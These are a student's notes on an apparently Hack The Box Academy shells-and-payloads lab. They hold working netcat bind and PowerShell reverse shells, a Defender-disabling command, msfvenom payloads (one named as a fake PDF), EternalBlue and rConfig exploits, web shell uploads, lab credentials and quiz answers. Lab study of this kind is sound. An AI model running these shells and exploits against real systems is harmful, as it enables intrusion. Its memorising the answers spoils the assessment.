## Shell Basics
#### Bind Shells
```
## Practicing with GNU Netcat

Target@server:~$ nc -lvnp 7777

areaeric@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$ nc -lvnp 7777

areaeric@htb[/htb]$ nc -nv 10.129.41.200 7777

Victim@server:~$ nc -lvnp 7777

## Establishing a Basic Bind Shell with Netcat

get@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

areaeric@htb[/htb]$ nc -nv 10.129.41.200 7777

Q1: 443
Q2: Directly follow section on "Establishing a Basic Bind shell with Netcat"
```

#### Reverse shells
```
## Hands-on With a Simple Reverse Shell in Windows

areaeric@htb[/htb]$ sudo nc -lvnp 443

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true

areaeric@htb[/htb]$ sudo nc -lvnp 443

## Questions
Q1. client
Q2. Follow section, but need admin access to disable powershell 

```

## Payloads
#### Automating Payloads & Delivery with Metasploit
```
## Practising with Metasploit

areaeric@htb[/htb]$ sudo msfconsole 

areaeric@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25
- Create a handler.rc file
use exploit/windows/smb/psexec
set rhosts 10.129.180.71
set share ADMIN$
set SMBPass HTB_@cademy_stdnt!
set SMBUser htb-student
set LHOST 10.10.11.200
exploit

msfconsole -r handle.rc

shell

## Questions
Q1: Powershell, Powershell is used to execute to the exploit
Q2: Follows directly from section, modify the handler file option
```

#### Crafting Payloads with MSFvenom
```
areaeric@htb[/htb]$ msfvenom -l payloads

## Building A Stageless Payload (ubuntu)

areaeric@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

## Builiding a simple Stageless Payload for a Windows system

areaeric@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

## Windows Shells
#### Infiltrating Windows
```shell-session
## Enumerating Windows & Fingerprinting Methods

areaeric@htb[/htb]$ ping 192.168.86.39 

areaeric@htb[/htb]$ sudo nmap -v -O 192.168.86.39

areaeric@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse

## Example compromise walkthrough

areaeric@htb[/htb]$ nmap -v -A 10.129.201.97

msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97
RHOSTS => 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

msf6 > search eternal
msf6 > use 2
msf6 exploit(windows/smb/ms17_010_psexec) > options
msf6 exploit(windows/smb/ms17_010_psexec) > show options
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
meterpreter > shell

## Questions
Q1: .bat
Q2: MS17-010
Q3: Follow directly from section
```


## NIX shells
#### Infiltrating Unix/Linux
```
## Gaining a Shell Through Attacking a Vulnerable Application

areaeric@htb[/htb]$ nmap -sC -sV 10.129.201.101

msf6 > search rconfig

areaeric@htb[/htb]$ locate exploits

msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce

Note: Use what you have learned in the module thus far to fill out the options associated with the exploit.

msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

meterpreter > shell

## Spawning a TTY Shell with Python

python -c 'import pty; pty.spawn("/bin/sh")' 

## Questions
Q1: PHP
Q2: Follow directly from section
```

#### Spawning Interactive Shells

```
## Various ways to make shell nice

/bin/sh -i

perl â€”e 'exec "/bin/sh";'

perl: exec "/bin/sh";

ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')
	
awk 'BEGIN {system("/bin/sh")}'

find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

find . -exec /bin/sh \; -quit

vim -c ':!/bin/sh'

vim
:set shell=/bin/sh
:shell

## Execution Permissions Considerations

ls -la <path/to/fileorbinary>

sudo -l

Note: sudo -l requires a stable interactive shell to run.
```

## Web Shells

#### Laudanum, One Webshell to Rule Them All
```
## Laudanum Deonstration

areaeric@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx

- Modify the shell for use, on line 59, add our IP to allowed IP

- Take advanatge of upload function of the website

- Navigate to our shell

## Questions
Q1: c:\windows\system32\inetsrv
Q2: Directly follow the section
```

#### Antak Webshell

```
## Antak Demonstration

ls /usr/share/nishang/Antak-WebShell

areaeric@htb[/htb]$ cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx

- Moify the Shell for use (line14, give it a username and password)

- Upload the shell

Q1: /usr/share/nishang/Antak-WebShell/antak.aspx
Q2: Follow section
```


#### PHP Web Shells
```
## Hands-on With a PHP-Based Web Shell.

- Naviagate to website -> Devices -> vendors -> Add vendors

- Use burp to intercept traffic

## Bypassing the File Type Resriction

- Intercept the response and use WhiteWinterWolf's PHP Webshell, change the image type to image/gif

## Questions
Q1: image/gif
Q2: ajax-loader.gif, follow directly from section
```


## Skills Assessment
####The Live engagement
```

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.183.48 /tls-seclevel:0 /timeout:80000
- Looked at Desktop:
blog creds:
- admin / admin123!@#  ( keep it simple for the new admins )

Q1/Q2:
Tomcat Apache creds:
- tomcat / Tomcatadm


cp /usr/share/laudanum/jsp/cmd.war ~/Desktop/demo.war
- Upload webshell
- Go to webshell, hostnamem


msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4443 -f war > backup.war
nc -lvnp 4443
- Upload reverse shell

- Catch reverse shell, dir C:\Shares


Q3:
- Go to blog.inlanefreight.local, identified an vulnerability blog post
cat /etc/hosts
sudo nmap -sV 172.16.1.12 -p80

Q4:
Run the 50064.rb script on metasploit.

Q5:
sudo nmap -A 172.16.1.13


Q6:
Run eternal blue
use exploit/windows/smb/ms17_010_psexec
shell

more c:\Users\Administrator\Desktop\Skills-flag.txt
```